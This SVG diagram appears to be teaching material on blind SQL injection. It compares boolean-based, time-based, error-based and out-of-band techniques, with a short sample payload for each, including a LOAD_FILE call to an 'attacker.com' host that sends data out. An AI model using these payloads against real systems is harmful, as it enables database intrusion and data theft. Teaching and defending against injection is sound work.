<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 400" font-family="Arial, sans-serif">
  <defs>
    <marker id="arrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0,10 3.5,0 7" fill="#4a90e2"/>
    </marker>
  </defs>
  <text x="360" y="30" text-anchor="middle" font-size="16" font-weight="bold" fill="#333">Blind SQL Injection Techniques</text>
  <!-- Boolean-based -->
  <rect x="30" y="60" width="320" height="70" rx="5" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2"/>
  <text x="190" y="85" text-anchor="middle" font-size="12" font-weight="bold" fill="#4a90e2">Boolean-Based Blind</text>
  <text x="190" y="103" text-anchor="middle" font-size="10" fill="#333">Different response for TRUE vs FALSE</text>
  <text x="190" y="118" text-anchor="middle" font-size="9" fill="#666" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
  <!-- Time-based -->
  <rect x="370" y="60" width="320" height="70" rx="5" fill="#fff3cd" stroke="#ffc107" stroke-width="2"/>
  <text x="530" y="85" text-anchor="middle" font-size="12" font-weight="bold" fill="#e6a800">Time-Based Blind</text>
  <text x="530" y="103" text-anchor="middle" font-size="10" fill="#333">SLEEP/WAITFOR delays on TRUE</text>
  <text x="530" y="118" text-anchor="middle" font-size="9" fill="#666" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</text>
  <!-- Error-based -->
  <rect x="30" y="150" width="320" height="70" rx="5" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
  <text x="190" y="175" text-anchor="middle" font-size="12" font-weight="bold" fill="#dc3545">Error-Based</text>
  <text x="190" y="193" text-anchor="middle" font-size="10" fill="#333">Force errors that leak data</text>
  <text x="190" y="208" text-anchor="middle" font-size="9" fill="#666" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
  <!-- Out-of-band -->
  <rect x="370" y="150" width="320" height="70" rx="5" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
  <text x="530" y="175" text-anchor="middle" font-size="12" font-weight="bold" fill="#28a745">Out-of-Band (OOB)</text>
  <text x="530" y="193" text-anchor="middle" font-size="10" fill="#333">DNS/HTTP to attacker server</text>
  <text x="530" y="208" text-anchor="middle" font-size="9" fill="#666" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
  <!-- Comparison -->
  <rect x="60" y="260" width="600" height="110" rx="5" fill="#e8f4f8" stroke="#4a90e2" stroke-width="1.5"/>
  <text x="360" y="285" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Technique Comparison</text>
  <text x="140" y="310" text-anchor="middle" font-size="10" font-weight="bold" fill="#4a90e2">Speed</text>
  <text x="280" y="310" text-anchor="middle" font-size="10" font-weight="bold" fill="#4a90e2">Reliability</text>
  <text x="430" y="310" text-anchor="middle" font-size="10" font-weight="bold" fill="#4a90e2">Stealthiness</text>
  <text x="570" y="310" text-anchor="middle" font-size="10" font-weight="bold" fill="#4a90e2">Detection</text>
  <text x="140" y="335" text-anchor="middle" font-size="9" fill="#333">Boolean: Fast</text>
  <text x="280" y="335" text-anchor="middle" font-size="9" fill="#333">Boolean: High</text>
  <text x="430" y="335" text-anchor="middle" font-size="9" fill="#333">Time: Low</text>
  <text x="570" y="335" text-anchor="middle" font-size="9" fill="#333">OOB: Hardest</text>
  <text x="140" y="355" text-anchor="middle" font-size="9" fill="#333">Time: Slow</text>
  <text x="280" y="355" text-anchor="middle" font-size="9" fill="#333">OOB: Medium</text>
  <text x="430" y="355" text-anchor="middle" font-size="9" fill="#333">Boolean: Medium</text>
  <text x="570" y="355" text-anchor="middle" font-size="9" fill="#333">Error: Easiest</text>
</svg>
